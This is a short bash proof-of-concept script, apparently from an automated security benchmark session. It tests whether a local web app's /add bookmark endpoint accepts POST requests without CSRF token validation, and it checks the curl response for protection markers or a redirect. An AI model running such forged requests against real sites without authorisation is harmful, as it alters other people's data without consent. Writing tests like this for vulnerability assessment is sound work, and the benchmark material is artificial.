#!/bin/bash
# POC: CSRF vulnerability POC - demonstrates that POST requests to /add endpoint are accepted without CSRF token validation, allowing unauthorized bookmark additions through cross-site requests
# Target: ./repo
# Created: 2025-12-01T15:44:05.425Z
# Session: benchmark-XBEN-075-24-minbd1zc

# CSRF Vulnerability POC - Missing Token Protection on /add Endpoint
# This demonstrates that POST requests to /add are accepted without CSRF token validation

TARGET_URL="http://localhost:5000"
ADD_ENDPOINT="${TARGET_URL}/add"

echo "=== CSRF Token Protection Test ==="
echo "Target: $ADD_ENDPOINT"
echo ""

# Test 1: Direct POST without CSRF token - should succeed if vulnerable
echo "[TEST 1] Attempting POST to /add without CSRF token..."
echo "Command: curl -X POST $ADD_ENDPOINT -d \"name=CSRF_Test&url=http://csrf-test.com\" -v"
echo ""

response=$(curl -X POST "$ADD_ENDPOINT" \
  -d "name=CSRF_Test_$(date +%s)&url=http://csrf-test.com" \
  -i 2>/dev/null)

echo "Response:"
echo "$response"
echo ""

# Check for CSRF token requirement in response
if echo "$response" | grep -q "csrf_token\|CSRF\|403\|Forbidden"; then
    echo "[RESULT] CSRF protection appears to be IN PLACE"
    echo "Response indicates CSRF token validation is active"
    exit 1
else
    echo "[RESULT] NO CSRF TOKEN PROTECTION DETECTED"
    echo "POST request was accepted without CSRF token validation"
    
    # Check if redirect indicates success
    if echo "$response" | grep -q "302\|Location"; then
        echo "Status: POST was accepted and processed (redirect response)"
        exit 0
    fi
fi